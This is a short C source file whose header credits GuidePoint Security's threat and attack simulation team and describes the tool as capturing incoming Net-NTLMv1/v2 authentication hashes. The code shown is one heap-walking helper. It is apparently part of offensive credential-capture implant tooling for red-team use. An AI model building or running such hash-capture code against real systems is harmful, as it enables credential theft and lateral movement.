/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:	Checks if the region is a heap pointer.
 *
 * @param:	Pointer to the API structure.
 * @param:	Pointer.
 * @param:	Length of the valid heap.
 *
**/

D_SEC( E ) BOOL IsHeapPtr( _In_ PAPI Api, _In_ PVOID Heap, _Out_ PULONG Len )
{
	BOOL			Ret = FALSE;
	PVOID			Mgr = NULL;
	PROCESS_HEAP_ENTRY	Ent;

	*Len = 0; Ret = FALSE; Ent.lpData = NULL;
	Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

	if ( Api->HeapLock( Mgr ) ) {

		RtlSecureZeroMemory( &Ent, sizeof( Ent ) );
		Ent.lpData = NULL;

		while ( Api->HeapWalk( Mgr, &Ent ) ) {
			if ( Ent.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
				if ( Ent.lpData == Heap ) {
					Ret = TRUE; *Len = Ent.cbData;
				};
			};
		};
		Api->HeapUnlock( Mgr );
	};
	return Ret;
};
